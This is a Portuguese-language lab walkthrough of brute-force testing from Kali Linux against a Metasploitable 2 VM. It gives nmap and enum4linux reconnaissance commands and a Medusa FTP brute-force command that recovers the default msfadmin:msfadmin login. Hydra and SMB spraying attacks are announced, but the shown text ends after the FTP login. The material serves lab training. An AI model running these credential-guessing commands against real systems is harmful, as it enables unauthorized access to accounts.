# Ataques de Força Bruta com Medusa — Meu Passo a Passo 

# IP 192.168.93.134 e o login funcional: msfadmin:msfadmin


# O que estou fazendo aqui

Neste projeto documentei tudo o que fiz durante meus testes práticos de força bruta usando:

Kali Linux 

Metasploitable 2

Medusa

Hydra

Enum4linux

DVWA

# Realizei 3 ataques principais:

Ataque de Força Bruta em FTP

Ataque a Formulário Web (DVWA) usando Hydra

Password Spraying em SMB

E ainda deixei scripts automatizados para facilitar a repetição dos testes.

# Preparação do Ambiente

Antes de começar, montei meu ambiente desse jeito:

Abri o VirtualBox

Iniciei as duas VMs:

Kali Linux (atacante)

Metasploitable 2 (alvo)

Configurei as duas máquinas para funcionarem em rede host-only.

Depois conferi os IPs

# O IP da máquina alvo

192.168.93.134

Testei a comunicação:

ping -c 3 192.168.93.134

Quando respondeu sem perda de pacotes, parti para os testes.

# Instalando as Ferramentas

No Kali, atualizei e instalei tudo que precisaria:

sudo apt update
sudo apt install -y medusa hydra enum4linux smbclient nmap ftp tcpdump


# Testei rápido

medusa -h
hydra -h
enum4linux -h

Tudo funcionando.

# Reconhecimento — Primeira etapa fundamental

Fiz um scan completo da máquina alvo:

nmap -sV -p- 192.168.93.134 -oN scan_full.txt


Depois refinei para portas importantes:

nmap -sV -p21,22,80,139,445 192.168.93.134 -oN scan_basic.txt


Enumerei SMB:

enum4linux -a 192.168.93.134 | tee smb_enum.txt


As portas 21, 80, 139 e 445 apareceram abertas — perfeito para os ataques.

# ATAQUES REALIZADOS
1Ataque FTP com Medusa (Credenciais válidas encontradas)

Criei uma wordlist 


Executei o ataque:

medusa -h 192.168.93.134 -u msfadmin -P lista.txt -M ftp -f | tee medusa_ftp.txt


A senha válida encontrada foi:

Usuário: msfadmin
Senha: msfadmin

Confirmei acesso manualmente:

ftp 192.168.93.134


Login funcionou.

